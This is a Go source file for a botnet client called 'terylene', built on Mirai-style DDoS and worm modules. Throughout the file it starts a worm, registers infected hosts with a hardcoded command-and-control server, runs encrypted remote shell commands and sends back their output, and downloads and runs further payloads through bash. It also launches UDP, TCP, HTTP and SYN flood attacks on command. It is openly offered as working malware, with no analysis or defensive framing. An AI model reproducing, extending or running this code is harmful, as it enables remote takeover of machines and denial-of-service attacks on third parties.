package main

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	config "terylene/config"
	zcrypto "terylene/crypto"
	system "terylene/mirai/components/system"
	"terylene/mirai/components/worm"
	attack "terylene/mirai/ddos"
	"time"

	"github.com/fatih/color"
	zmq "github.com/pebbe/zmq4"
)

type Method struct {
	name         string
	path         string
	flag_entries []methflag
	rawformat    string
}

type methflag struct {
	entry     string
	entrytype string
}

type postC2info struct {
	C2ip  string
	rport string
}

type C2info struct {
	postC2info postC2info
	bport      string
}

type conninfo struct {
	connid string
	bot    string
}

type zmqinstance struct {
	zcontext    *zmq.Context
	zdealer     *zmq.Socket
	zsubscriber *zmq.Socket
}

var (
	dealmut        sync.Mutex
	custom_methods = make([]Method, 0)
)

func isValidType(t string) bool {
	validTypes := map[string]bool{
		"string": true,
		"ip":     true,
		"port":   true,
		"int":    true,
	}

	return validTypes[t]
}

func getFreshSocket() (nzmqinst zmqinstance) {
	log.Println("Getting Fresh Context")
	ncontext, err := zmq.NewContext()
	if err != nil {
		log.Fatalln(err)
	}

	ndealer, err := ncontext.NewSocket(zmq.DEALER)
	if err != nil {
		log.Fatalln(err)
	}

	nsubscriber, err := ncontext.NewSocket(zmq.SUB)

	if err != nil {
		log.Fatalln(err)
	}

	return zmqinstance{
		zcontext:    ncontext,
		zdealer:     ndealer,
		zsubscriber: nsubscriber,
	}

}

func recmig(zmqinst zmqinstance, postC2info postC2info, recsignal <-chan struct{}, migsignal <-chan postC2info) {
	select {
	case <-recsignal:
		zmqinst.zcontext.Term()
		log.Println("Reconnection triggered")
		nzmqinst := getFreshSocket()
		log.Println("reconnecting...")
		err := register(nzmqinst, postC2info, time.Minute*30)
		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
			log.Println("reconnection timed out , returning to mother")
			nzmqinst.zsubscriber.SetLinger(0)
			nzmqinst.zdealer.SetLinger(0)
			nzmqinst.zdealer.Close()
			nzmqinst.zsubscriber.Close()
			nzmqinst.zcontext.Term()
			returntomother()
		} else {
			os.Exit(3)
		}
	case miginfo := <-migsignal:
		zmqinst.zcontext.Term()
		log.Println("Migration triggered")
		nzmqinst := getFreshSocket()
		RemoveAllMethods()
		err := register(nzmqinst, miginfo, time.Minute*30)
		if zmq.AsErrno(err) == zmq.ETIMEDOUT {
			log.Println("Migration timed out , returning to mother")
			nzmqinst.zsubscriber.SetLinger(0)
			nzmqinst.zdealer.SetLinger(0)
			nzmqinst.zdealer.Close()
			nzmqinst.zsubscriber.Close()
			nzmqinst.zcontext.Term()
			returntomother()
		} else {
			os.Exit(3)
		}
	}
}

func returntomother() {

	RemoveAllMethods()

	nzmqinst := getFreshSocket()

	err := register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Hour*168)
	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
		os.Exit(4)
	} else {
		os.Exit(4)
	}
}

func RemoveAllMethods() error {
	err := filepath.Walk("methods", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if path == "methods" {
			return nil
		}
		if info.IsDir() {
			err := os.RemoveAll(path)
			if err != nil {
				return err
			}
		} else {
			err := os.Remove(path)
			if err != nil {
				return err
			}
		}
		return nil
	})
	if err != nil {
		return err
	}
	return nil
}
func signalhandler(zmqins zmqinstance, C2info C2info, conninfo conninfo, subdown, dealdown chan struct{}, recsignal chan<- struct{}, submigsignal chan struct{}, dealmigsignal chan postC2info, migsignal chan postC2info) {
	for {
		select {
		case <-subdown:
			log.Println("subscriber channel down")
			select {
			case <-dealdown:
				log.Println("dealer channel down")
				recsignal <- struct{}{}
				break
			case <-time.After(time.Second * 20):
				log.Println("reconnecting subscriber channel")
				subscriber, err := zmqins.zcontext.NewSocket(zmq.SUB)
				if err != nil {
					log.Fatalln(err)
				}
				go subhandler(subscriber, C2info.postC2info.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
			}
		case <-dealdown:
			log.Println("dealer channel down")
			select {
			case <-subdown:
				log.Println("subscriber channel down")
				recsignal <- struct{}{}
				break
			case <-time.After(time.Second * 20):
				log.Println("reconnecting dealer channel")
				ndealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
				if err != nil {
					log.Fatalln(err)
				}
				log.Println("reregistration initiating")

				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
				if err != nil {
					log.Fatalln(err)
				}

				arch, OS, pubip, localip := system.GETSYSTEM()

				if err != nil {
					log.Fatalln(err)
				}

				log.Println("generating Conn ID")
				connId := system.GenerateConnID(localip, pubip)

				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)

				res, err := ndealer.RecvMessage(0)
				if err != nil {
					log.Fatalln(err)
				}

				if res[0] == "terylene" {
					go dealerhandle(ndealer, dealdown, migsignal, res[2])
				} else {
					log.Fatalln("router reconnection declined")
				}
			}

		case <-submigsignal:
			log.Println("subscriber channel ready for migration")
			select {
			case postinfo := <-dealmigsignal:
				log.Println("dealer channel ready for migration")
				migsignal <- postinfo
				break
			case <-time.After(time.Second * 20):
				log.Println("dealer channel not ready for migration")
				log.Println("reconnecting to subscriber")
				subscriber, err := zmqins.zcontext.NewSocket(zmq.SUB)
				if err != nil {
					log.Fatalln(err)
					go subhandler(subscriber, C2info.postC2info.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
				}
			}
		case postinfo := <-dealmigsignal:
			log.Println("dealer channel ready for migration")
			select {
			case <-submigsignal:
				log.Println("subscriber channel ready for migration")
				migsignal <- postinfo
			case <-time.After(time.Second * 20):
				log.Println("subscriber channel not ready for migration")
				log.Println("reconnecting to dealer")
				ndealer, err := zmqins.zcontext.NewSocket(zmq.DEALER)
				if err != nil {
					log.Fatalln(err)
				}
				log.Println("reregisteration initiating")

				err = ndealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
				arch, OS, pubip, localip := system.GETSYSTEM()

				if err != nil {
					log.Fatalln(err)
				}

				log.Println("generating Conn ID")
				connId := system.GenerateConnID(localip, pubip)

				ndealer.SendMessage("reg", arch, OS, localip, pubip, connId)

				res, _ := ndealer.RecvMessage(0)

				if res[0] == "terylene" {
					go dealerhandle(ndealer, dealdown, migsignal, res[2])
				} else {
					log.Fatalln("router reregistration declined")
				}
			}
		}
	}
}

func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) error {

	RemoveAllMethods()

	dealer := zmqins.zdealer
	subscriber := zmqins.zsubscriber

	err := dealer.Connect(fmt.Sprintf("tcp://%s:%s", postinfo.C2ip, postinfo.rport))

	if err != nil {
		log.Fatalln(err)
	}

	subdown := make(chan struct{})
	dealdown := make(chan struct{})
	reconsignal := make(chan struct{})

	dealmigsignal := make(chan postC2info)
	migsignal := make(chan postC2info)
	submigsignal := make(chan struct{})

	if err != nil {
		log.Fatalln(err)
	}

	arch, OS, pubip, localip := system.GETSYSTEM()

	log.Println("generating Conn ID")
	connId := system.GenerateConnID(localip, pubip)

	log.Printf("registering to router %s on %s\n", postinfo.C2ip, postinfo.rport)
	_, err = dealer.SendMessage("reg", arch, OS, localip, pubip, connId)

	if err != nil {
		log.Fatalln(err)
		return err
	}

	dealer.SetRcvtimeo(timeout)

	res, err := dealer.RecvMessage(0)
	if err != nil {
		log.Fatalln(err)
		return err
	}

	if res[0] == "terylene" {
		log.Println("assigned as terylene")
		C2info := C2info{
			postC2info: postinfo,
			bport:      res[1],
		}
		conninfo := conninfo{
			connid: connId,
			bot:    res[0],
		}

		go signalhandler(zmqins, C2info, conninfo, subdown, dealdown, reconsignal, submigsignal, dealmigsignal, migsignal)
		go dealerhandle(dealer, dealdown, dealmigsignal, res[2])
		go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
		recmig(zmqins, postinfo, reconsignal, migsignal)
		return nil
	} else if res[0] == "kys" {
		for i := 1; i < 4; i++ {
			_, err := dealer.SendMessage("reg", arch, OS, localip, pubip, connId)
			if err != nil {
				break
			}
			res, err := dealer.RecvMessage(0)
			if err != nil {
				break
			}

			if res[0] == "kys" {
				time.Sleep(time.Second * 2)
			} else if res[0] == "terylene" {
				log.Println("assigned as terylene")

				C2info := C2info{
					postC2info: postinfo,
					bport:      res[1],
				}
				conninfo := conninfo{
					connid: connId,
					bot:    res[0],
				}

				go signalhandler(zmqins, C2info, conninfo, subdown, dealdown, reconsignal, submigsignal, dealmigsignal, migsignal)
				go dealerhandle(dealer, dealdown, dealmigsignal, res[2])
				go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown, submigsignal)
				recmig(zmqins, postinfo, reconsignal, migsignal)
				return nil
			} else {
				time.Sleep(time.Second * 2)
			}
		}
	}
	return err
}

func cmdhandler(command string, key []byte, dealer *zmq.Socket) {
	if command == "clear" {
		return
	}

	parts := strings.Fields(command)

	if len(parts) == 0 {
		log.Println("Empty command received")
		return
	}

	if parts[0] == "cd" {
		if len(parts) < 2 {
			output := "Invalid 'cd' command: Missing argument"
			encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
			if err != nil {
				log.Println(err)
				return
			}
			dealer.SendMessage("cmdE", string(encoutput))
		}

		err := os.Chdir(parts[1])
		if err != nil {
			output := fmt.Sprintf("Error changing directory:%s", err)
			encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
			if err != nil {
				log.Println(err)
				return
			}
			dealer.SendMessage("cmdE", string(encoutput))
		}
		return
	}

	cmd := exec.Command(parts[0], parts[1:]...)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("Error creating StdoutPipe for Cmd", err)
		return
	}

	if err := cmd.Start(); err != nil {
		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(err.Error()), key)
		if err != nil {
			log.Println(err)
			return
		}
		dealer.SendMessage("cmdE", string(encoutput))

		return
	}

	// Create new reader from the pipe
	reader := bufio.NewReader(stdout)

	// Goroutine for printing the output
	go func() {
		for {
			output, _, err := reader.ReadLine()
			if err != nil {
				break
			}

			encoutput, err := zcrypto.EncryptChaCha20Poly1305(output, key)
			if err != nil {
				log.Println(err)
				continue
			}
			dealer.SendMessage("cmdS", string(encoutput))
		}
	}()

	// Wait for the command to finish
	err = cmd.Wait()
	if err != nil {
		if err.Error() == "exit status 255" {
			return
		}
		output := fmt.Sprintf("Error waiting for command:%s", err)
		encoutput, err := zcrypto.EncryptChaCha20Poly1305([]byte(output), key)
		if err != nil {
			log.Println(err)
		}
		dealer.SendMessage("cmdE", string(encoutput))
	}
}

func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal chan<- postC2info, key string) {
	log.Println("Subscribed to the dealer socket")
	dealer.SetRcvtimeo(time.Second * 10)
	polykey, err := zcrypto.DecryptAES256(key, []byte(config.AESkey))
	if err != nil {
		log.Fatalln(err)
	}
	for {
		res, err := dealer.RecvMessage(0)
		if err != nil {
			log.Printf("dealer channel: %s", err)
			dealer.SetLinger(0)
			dealer.Close()
			log.Println("dealer channel closed")
			dealdown <- struct{}{}
			break
		}

		if res[0] == "h" {
			dealmut.Lock()
			dealer.SendMessage("h")
			dealmut.Unlock()
		}

		if res[0] == "kill" {
			log.Fatalln("killed by C2 owner")
		}

		if len(res) == 2 {
			if res[0] == "cmd" {
				command, err := zcrypto.DecryptChaCha20Poly1305([]byte(res[1]), polykey)
				if err != nil {
					log.Println(err)
					continue
				}
				go cmdhandler(string(command), []byte(polykey), dealer)
			}
		}
		if len(res) == 3 {
			if res[0] == "migrate" {
				var details postC2info
				details.C2ip = res[1]
				details.rport = res[2]
				log.Println("dealer migration triggered")
				dealer.SetLinger(0)
				dealer.Close()
				log.Println("dealer channel closed")
				dealmigsignal <- details
				break
			}
		}

	}
}

func methodentry(rawformat string) ([]methflag, error) {
	var flags []methflag
	seen := make(map[string]bool)
	ifmain := false

	pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
	re := regexp.MustCompile(pattern)

	matches := re.FindAllStringSubmatch(rawformat, -1)

	if len(matches) == 0 {
		return flags, errors.New("there are no entry")
	}

	for _, match := range matches {

		if match[1] == "main" {
			ifmain = true
		}

		if seen[match[1]] {
			color.Red("duplication value detected:%s", match[1])
			return flags, fmt.Errorf("duplication value detected:%s", match[1])
		} else {
			seen[match[1]] = true
		}

		if !isValidType(match[2]) {
			return flags, fmt.Errorf("invalid type '%s' for %s entry", match[2], match[1])
		}

		flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
	}

	if !ifmain {
		return flags, errors.New("format has no main argument")
	}

	return flags, nil
}

func deletemethod(methodName string) {
	for i, method := range custom_methods {
		if method.name == methodName {
			custom_methods = append(custom_methods[:i], custom_methods[i+1:]...)
			os.Remove(method.path)

			log.Println(methodName, "deleted successfully")
			return
		}
	}

	log.Println("no method found with name: ", methodName)
}
func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown chan<- struct{}, submigsignal chan<- struct{}) {
	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))

	subscriber.SetRcvtimeo(time.Second * 20)
	subscriber.SetSubscribe(bot)
	subscriber.SetSubscribe(connid)
	log.Printf("subscribed to the %s channel\n", bot)

	var file *os.File
	var methname string
	var filename string
	var filepath string

loop:
	for {
		recved, err := subscriber.RecvMessage(0)

		if err != nil {
			log.Printf("subscriber channel: %s\n", err)
			subscriber.SetLinger(0)
			subscriber.Close()
			log.Println("subscriber channel closed")
			subdown <- struct{}{}
			break
		}

		if len(recved) == 0 || len(recved) == 1 {
			log.Println("malformed message ignored")
			continue
		}

		if recved[1] == "h" {
			continue
		}

		if len(recved) == 3 {
			if recved[1] == "deletemethod" {
				deletemethod(recved[2])
			}
		}
		if len(recved) > 2 {
			switch recved[1] {
			case "file_start":
				methname = recved[2]
				filename = recved[3]
				filepath = "methods/" + filename
				file, err = os.Create(filepath)

				if err != nil {
					log.Printf("failed to create file: %v", err)
					break
				}
				continue

			case "file_chunk":
				if file != nil && recved[2] == methname {
					decoded, err := base64.StdEncoding.DecodeString(recved[3])
					if err != nil {
						log.Println("failed to decode base64 for file", filename)
						continue
					}

					_, err = file.Write(decoded)

					if err != nil {
						log.Printf("failed to write to file: %v", err)
						if file != nil {
							file.Close()
						}
						break
					}
				}
				continue
			case "file_end":
				if file != nil && methname == recved[2] {

					file.Close()
					file = nil

					rawformat := recved[3]

					entries, err := methodentry(rawformat)

					if err != nil {
						log.Println(err)
						break
					}

					custom_methods = append(custom_methods, Method{name: methname, path: filepath, flag_entries: entries, rawformat: rawformat})
					log.Println("recieved method", methname, "successfully")
					err = os.Chmod(filepath, 0755)

					methname = ""
					filename = ""
					filepath = ""
					file = nil

					if err != nil {
						log.Println("Error:", err)
						return
					}
					continue
				}
			case "migrate":
				submigsignal <- struct{}{}
				break loop
			case "killall":
				os.Exit(2)
			}
		}
		methodhandler(recved)
	}
}

func methodhandler(messages []string) {
	if len(messages) == 5 {
		switch messages[1] {
		case "UDP":
			go attack.UDP(messages[2], messages[3], messages[4])
		case "TCP":
			go attack.TCP(messages[2], messages[3], messages[4])
		case "HTTP":
			go attack.HTTP(messages[2], messages[3], messages[4])
		case "UDPRAPE":
			go attack.UDPRAPE(messages[2], messages[3], messages[4])
		case "SYN":
			go attack.SYN(messages[2], messages[3], messages[4])
		case "UDP-VIP":
			go attack.UDP_VIP(messages[2], messages[3], messages[4])
		}
	}

	if len(messages) > 1 {
		for _, value := range custom_methods {
			if value.name == messages[1] {
				pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"

				regexpPattern := regexp.MustCompile(pattern)

				values := []string{value.path}

				for _, i := range messages {
					if i == "terylene" || i == value.name {
						continue
					}
					values = append(values, i)
				}

				// Initialize an index to keep track of which value to replace with
				valueIndex := 0

				// Replace placeholders with values
				outputString := regexpPattern.ReplaceAllStringFunc(value.rawformat, func(match string) string {
					if valueIndex >= len(values) {
						return match // more values, return the original match
					}

					// Replace the placeholder with the corresponding value
					replacement := values[valueIndex]
					valueIndex++ // Move to the next value
					return replacement
				})

				fmt.Println(outputString)

				go func() {
					cmd := exec.Command("bash", "-c", outputString)

					output, err := cmd.CombinedOutput()
					if err != nil {
						fmt.Println("Error executing command:", err)
						return
					}

					log.Println(string(output))
				}()

				return
			}
		}
	}
}

func main() {
	go worm.Startworm()
	nzmqinst := getFreshSocket()

	os.Mkdir("methods", 0755)

	register(nzmqinst, postC2info{C2ip: config.C2ip, rport: config.Routerport}, time.Second*10)
}
